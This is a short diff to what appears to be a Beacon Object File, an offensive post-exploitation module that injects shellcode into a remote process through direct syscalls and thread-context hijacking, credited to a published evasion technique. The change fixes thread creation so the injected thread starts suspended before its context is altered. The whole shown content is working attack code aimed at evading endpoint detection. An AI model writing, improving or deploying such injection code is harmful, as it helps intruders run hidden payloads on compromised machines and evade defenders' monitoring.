@@ -1,5 +1,5 @@
-// Chris Sikes
-// Apr 2021
+// Author: Chris Sikes
+// Date: Apr 2021
 // Credit to: XPN's SetThreadContext https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/
 // Beacon Object file version with direct syscalls
 #include <windows.h>
@@ -35,11 +35,7 @@ void go(char * argc, int len)
 
 	void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
 	NtWriteVirtualMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
-	NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, Process_Handle, _loadLibrary, NULL, FALSE, 0, 0, 0, NULL);
-	// Suspend the thread
-	// You can create a thread started in a suspended state with virtualallocex
-	// but I don't know how to do it with NTCreateThreadEx
-	NtSuspendThread(threadHandle, NULL);
+	NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, Process_Handle, _loadLibrary, NULL, TRUE, 0, 0, 0, NULL);
 
 	ctx.ContextFlags = CONTEXT_CONTROL;
 	NtGetContextThread(threadHandle, &ctx);
